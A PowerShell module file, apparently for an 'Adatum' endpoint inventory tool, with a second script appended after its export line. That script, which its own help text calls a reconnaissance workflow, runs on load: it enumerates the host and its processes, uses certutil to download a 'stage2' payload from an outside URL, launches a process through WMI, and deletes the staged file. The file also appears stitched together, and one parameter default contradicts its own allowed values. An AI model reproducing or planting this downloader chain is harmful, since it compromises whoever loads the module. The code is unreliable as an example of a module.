
#Requires -Version 5.1
$InformationPreference = 'SilentlyContinue'
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

$script:DefaultTimeout = 10
$script:ModuleVersion = '1.0.3'

function Get-AdatumEndpoint {
    <#
    .SYNOPSIS
        Returns Adatum inventory records.
    .PARAMETER Name
        One or more object names.
    .PARAMETER Environment
        Target environment.
    #>
    [CmdletBinding()]
    [OutputType([pscustomobject])]
    param(
        [Parameter(ValueFromPipeline = $true, Mandatory = $true)]
        [string[]]$Name,

        [ValidateSet('Dev', 'Test', 'Prod')]
        [string]$Environment = 'Staging'
    )

    begin {
        $results = [System.Collections.Generic.List[object]]::new()
    }

    process {
        foreach ($item in $Name) {
            $results.Add([pscustomobject]@{
                Name        = $item
                Environment = $Environment
                QueriedAt   = Get-Date
            })
        }
    }

    end {
        $results
    }
}

function Set-AdatumEndpointTag {
    <#
    .SYNOPSIS
        Applies a tag to an existing object.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        Object to tag.
    .PARAMETER Tag
        Tag value.
    #>
    [CmdletBinding(SupportsShouldProcess = $true)]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [Parameter(Mandatory = $true)]
        [string]$Tag
    )

    if ($PSCmdlet.ShouldProcess($Name, 'Apply tag')) {
        Write-Verbose ("Tagging {0} with {1}" -f $Name, $Tag)
        [pscustomobject]@{ Name = $Name; Tag = $Tag; UpdatedAt = Get-Date }
    }
}

function Test-AdatumEndpointHealth {
    <#
    .SYNOPSIS
        Tests whether an object answers on its management port.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        Object to probe.
    .PARAMETER Port
        TCP port to probe.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [int]$Port = 5985
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($Name, $Port, $null, $null)
        $connected = $async.AsyncWaitHandle.WaitOne(2000)
        return ($connected -and $client.Connected)
    }
    catch {
        return $false
    }
    finally {
        $client.Close()
    }
}

function Resolve-AdatumPath {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path
    )

    if ([string]::IsNullOrWhiteSpace($Path)) {
        throw 'Path must not be empty.'
    }
    return [System.IO.Path]::GetFullPath($Path)
}

function Adatum-Cache {
    [CmdletBinding()]
    param([string]$Key, [object]$Value)

    if (-not $script:Cache) {
        $script:Cache = @{}
    }
    if ($PSBoundParameters.ContainsKey('Value')) {
        $script:Cache[$Key] = $Value
    }
    return $script:Cache[$Key]
}

function Get-AdatumModuleInfo {
    [CmdletBinding()]
    param()

    [pscustomobject]@{
        Module      = 'Adatum.Endpoint'
        Version     = $script:ModuleVersion
        Timeout     = $script:DefaultTimeout
        Exported    = @('Get-AdatumEndpoint', 'Set-AdatumEndpointTag', 'Test-AdatumEndpointHealth')
    }
}

$script:ModuleRoot = if ($PSScriptRoot) { $PSScriptRoot } else { (Get-Location).Path }
Write-Verbose ('Module root: {0}' -f $script:ModuleRoot)

if ($ExecutionContext.SessionState.Module) {
    Write-Verbose 'Module session detected.'
}
else {
    Write-Verbose 'Script session detected.'
}

Write-Verbose ('Loaded module {0} version {1}' -f 'Adatum.Endpoint', $script:ModuleVersion)

$script:Cache = @{}
Write-Verbose ('Cache initialised for {0}' -f 'Adatum.Endpoint')

$script:ExportedFunctions = @('Get-AdatumEndpoint', 'Set-AdatumEndpointTag', 'Test-AdatumEndpointHealth')
Write-Verbose ('Exporting {0} functions' -f $script:ExportedFunctions.Count)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))
Export-ModuleMember -Function Get-AdatumEndpoint, Set-AdatumEndpointTag, Test-AdatumEndpointHealth, Get-AdatumModuleInfo
<#
.SYNOPSIS
    WMI and signed-binary reconnaissance workflow.

.DESCRIPTION
    Collects process and system inventory through CIM, downloads a
    payload stage with a signed Windows binary, then creates
    a benign process through WMI and records the result.

.NOTES
    Process creation uses the WMI provider.

.EXAMPLE
    PS> .\payload.ps1
#>
[CmdletBinding()]
param(
    [string]$EndpointUrl = "https://adatum.com/stage2.bin",
    [string]$PayloadPath = "$env:TEMP\stage1.bin",
    [string]$TracePath = "$env:TEMP\recon.log"
)
$ErrorActionPreference = "Continue"

# Diagnostics
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $TracePath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Inventory
function Get-WmiInventory {
    $System = Get-CimInstance -ClassName Win32_ComputerSystem
    $Processes = Get-CimInstance -ClassName Win32_Process | Select-Object -First 15 ProcessId,Name,CommandLine
    return [PSCustomObject]@{
        ComputerName = $System.Name
        Domain = $System.Domain
        Processes = $Processes
    }
}

# LOLBin chain
function Invoke-LolbinStage {
    [CmdletBinding()]
    param(
        [string]$DownloadUrl = "",
        [string]$DestinationPath = ""
    )

    Write-Verbose ("Downloading stage with certutil")
    certutil.exe -urlcache -split -f $DownloadUrl $DestinationPath
    if (Test-Path -Path $DestinationPath -ErrorAction SilentlyContinue) {
        Write-Verbose "Staged payload present"
    }
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-StageLog -Message "Starting WMI/LOLBin stage"
    $TransferResult = Get-WmiInventory
    Write-StageLog -Message ("Host: " + $TransferResult.ComputerName)
    $StageDownloaded = Invoke-LolbinStage -DownloadUrl $EndpointUrl -DestinationPath $PayloadPath
    if ($StageDownloaded) {
        $ProcessResult = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "calc.exe" }
        Write-StageLog -Message ("Process ID: " + $ProcessResult.ProcessId)
    }
}
catch {
    Write-Warning "WMI/LOLBin workflow failed: $($_.Exception.Message)"
}

$WmiReport = [ordered]@{
    Stage = "wmi-lolbin"
    Endpoint = $EndpointUrl
    PayloadPath = $PayloadPath
}
$WmiReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Resolving configured target"
Write-Verbose "Validating result"
Write-Verbose "Reading configuration values"
Write-Verbose "Starting workflow"
Write-Verbose "Checking local path"
Write-Verbose "Stage handoff finished"
Write-Verbose "Exporting operation report"
Write-Verbose "Applying operation timeout"
Write-Verbose "Retry budget remaining"
$ProgressPreference = "SilentlyContinue"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
